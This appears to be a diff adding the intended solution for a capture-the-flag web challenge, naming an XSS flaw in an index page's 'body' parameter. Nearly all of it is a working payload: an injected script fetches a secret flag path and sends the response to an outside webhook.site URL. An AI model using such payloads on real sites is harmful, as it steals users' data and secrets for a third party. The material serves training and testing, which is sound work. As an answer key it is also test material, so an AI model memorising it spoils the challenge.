@@ -1,0 +1,24 @@
+Intended Solution:
+    XSS in 'body' parameter of index page
+    
+    One of the payloads: (body parameter):
+		<img src='https://webhook.site/f729a22b-f177-484b-aa1e-12e07bfdc868'>
+		<script>
+		fetch('/s3cr3t_fl4g_K1udg3')
+		.then(response => {
+			if (!response.ok) {
+			throw new Error('Network response was not ok');
+			}
+			return response.text();
+		})
+		.then(data => {
+			console.log(data);
+			url = 'https://webhook.site/f729a22b-f177-484b-aa1e-12e07bfdc868?data='+encodeURI(data);
+			console.log(url);
+			fetch(url);
+		})
+		.catch(error => {
+			console.error('There was a problem with the fetch operation:', error);
+		});
+		</script>
+	
